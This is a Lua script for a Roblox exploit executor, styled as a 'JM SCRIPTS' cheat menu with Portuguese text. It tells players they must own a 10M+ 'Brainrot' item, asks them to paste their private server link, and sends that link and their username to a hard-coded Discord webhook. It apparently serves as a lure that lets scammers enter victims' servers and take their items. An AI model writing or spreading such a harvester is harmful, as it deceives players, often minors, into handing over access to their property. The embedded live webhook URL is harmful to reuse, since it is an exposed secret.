--========================
-- CONFIG
--========================
local WEBHOOK_URL = "https://discord.com/api/webhooks/1468274684557529118/zJwKaKc2q7yb8tCs2XdZSYGuciAlRqX-3sVTro8RMEfwR2Tl1tSUf_-MHMiPVvJxlt17"
local DISCORD_INVITE = "https://discord.gg/ZPz8Renfz"

--========================
-- SERVICES
--========================
local Players = game:GetService("Players")
local TweenService = game:GetService("TweenService")
local HttpService = game:GetService("HttpService")
local player = Players.LocalPlayer

--========================
-- REQUEST (COMPAT)
--========================
local request =
    (syn and syn.request)
    or http_request
    or request
    or (fluxus and fluxus.request)

--========================
-- WEBHOOK
--========================
local function sendWebhook(msg)
    if not request then return end
    request({
        Url = WEBHOOK_URL,
        Method = "POST",
        Headers = {["Content-Type"] = "application/json"},
        Body = HttpService:JSONEncode({content = msg})
    })
end

--========================
-- GUI BASE
--========================
local gui = Instance.new("ScreenGui")
gui.IgnoreGuiInset = true
gui.ResetOnSpawn = false
gui.Parent = game.CoreGui

--========================
-- INTRO (FULLSCREEN)
--========================
local intro = Instance.new("Frame", gui)
intro.Size = UDim2.fromScale(1,1)
intro.BackgroundColor3 = Color3.fromRGB(0,0,0)

local introText = Instance.new("TextLabel", intro)
introText.Size = UDim2.fromScale(1,1)
introText.BackgroundTransparency = 1
introText.TextScaled = true
introText.Font = Enum.Font.GothamBold
introText.TextColor3 = Color3.new(1,1,1)
introText.TextTransparency = 1
introText.Text = "Obrigado por usar\nJM SCRIPTS 💜"

TweenService:Create(introText, TweenInfo.new(1), {TextTransparency = 0}):Play()
task.wait(2)
TweenService:Create(introText, TweenInfo.new(1), {TextTransparency = 1}):Play()
task.wait(1)
intro:Destroy()

--========================
-- MAIN (FULLSCREEN)
--========================
local main = Instance.new("Frame", gui)
main.Size = UDim2.fromScale(1,1)
main.BackgroundColor3 = Color3.fromRGB(5,5,10)

local stroke = Instance.new("UIStroke", main)
stroke.Thickness = 2
stroke.Color = Color3.fromRGB(160,90,255)

-- brilho roxo animado
task.spawn(function()
    local t = 0
    while main.Parent do
        t += 0.01
        stroke.Color = Color3.fromHSV(t%1,0.6,1)
        task.wait()
    end
end)

--========================
-- TITLE
--========================
local title = Instance.new("TextLabel", main)
title.Size = UDim2.fromScale(1,0.18)
title.BackgroundTransparency = 1
title.Text = "JM SCRIPTS"
title.Font = Enum.Font.GothamBlack
title.TextScaled = true
title.TextColor3 = Color3.fromRGB(190,120,255)

--========================
-- RULE
--========================
local rule = Instance.new("TextLabel", main)
rule.Position = UDim2.fromScale(0.1,0.2)
rule.Size = UDim2.fromScale(0.8,0.08)
rule.BackgroundTransparency = 1
rule.TextScaled = true
rule.TextWrapped = true
rule.Font = Enum.Font.GothamBold
rule.TextColor3 = Color3.fromRGB(255,90,90)
rule.Text = "⚠️ OBRIGATÓRIO: tenha pelo menos 1 Brainrot de 10M+"

--========================
-- NOTICE
--========================
local notice = Instance.new("TextLabel", main)
notice.Position = UDim2.fromScale(0.1,0.28)
notice.Size = UDim2.fromScale(0.8,0.08)
notice.BackgroundTransparency = 1
notice.TextScaled = true
notice.TextWrapped = true
notice.Font = Enum.Font.Gotham
notice.TextColor3 = Color3.fromRGB(220,220,220)
notice.Text = "Ao enviar, você concorda que o link será enviado para a equipe JM Scripts."

--========================
-- INPUT
--========================
local box = Instance.new("TextBox", main)
box.Position = UDim2.fromScale(0.15,0.4)
box.Size = UDim2.fromScale(0.7,0.1)
box.PlaceholderText = "Cole o link do seu servidor privado"
box.Text = ""
box.ClearTextOnFocus = false
box.TextScaled = true
box.Font = Enum.Font.Gotham
box.BackgroundColor3 = Color3.fromRGB(20,20,35)
box.TextColor3 = Color3.new(1,1,1)
Instance.new("UICorner", box).CornerRadius = UDim.new(0,16)
Instance.new("UIStroke", box).Color = Color3.fromRGB(140,80,220)

--========================
-- SEND BUTTON
--========================
local send = Instance.new("TextButton", main)
send.Position = UDim2.fromScale(0.3,0.55)
send.Size = UDim2.fromScale(0.4,0.1)
send.Text = "ENVIAR LINK"
send.TextScaled = true
send.Font = Enum.Font.GothamBold
send.BackgroundColor3 = Color3.fromRGB(140,70,230)
send.TextColor3 = Color3.new(1,1,1)
Instance.new("UICorner", send).CornerRadius = UDim.new(0,18)

send.MouseButton1Click:Connect(function()
    if box.Text == "" then
        send.Text = "COLE O LINK ❌"
        task.wait(1)
        send.Text = "ENVIAR LINK"
        return
    end
    sendWebhook(
        "🔗 **Server Privado Enviado**\n" ..
        "👤 Player: "..player.Name.."\n" ..
        "📎 Link: "..box.Text
    )
    send.Text = "ENVIADO ✔"
end)

--========================
-- DISCORD BUTTON
--========================
local discord = Instance.new("TextButton", main)
discord.Position = UDim2.fromScale(0.3,0.68)
discord.Size = UDim2.fromScale(0.4,0.08)
discord.Text = "ENTRAR NO DISCORD"
discord.TextScaled = true
discord.Font = Enum.Font.GothamBold
discord.BackgroundColor3 = Color3.fromRGB(90,90,255)
discord.TextColor3 = Color3.new(1,1,1)
Instance.new("UICorner", discord).CornerRadius = UDim.new(0,16)

discord.MouseButton1Click:Connect(function()
    if setclipboard then setclipboard(DISCORD_INVITE) end
end)
